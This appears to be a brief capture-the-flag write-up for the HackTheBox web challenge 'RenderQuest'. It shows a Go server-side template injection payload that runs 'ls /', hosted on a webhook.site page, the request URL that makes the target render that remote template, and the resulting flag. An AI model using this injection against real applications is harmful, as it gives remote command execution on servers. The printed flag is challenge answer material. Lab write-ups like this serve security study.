---
layout: post
title: HTB{RenderQuest}
author: mr4ndr3w
tags: [write-up, hackthebox, challenge, web]
---
<!--cut-->

* TOC
{:toc}

Create webhook with content.
```text
{{.FetchServerInfo "ls /"}}
```

Get flag:

```text
http://209.97.140.29:30692/render?use_remote=true&page=https://webhook.site/362e5709-55f9-4601-9405-dbc508679808
HTB{qu35t_f0r_th3_f0rb1dd3n_t3mpl4t35!!}
```
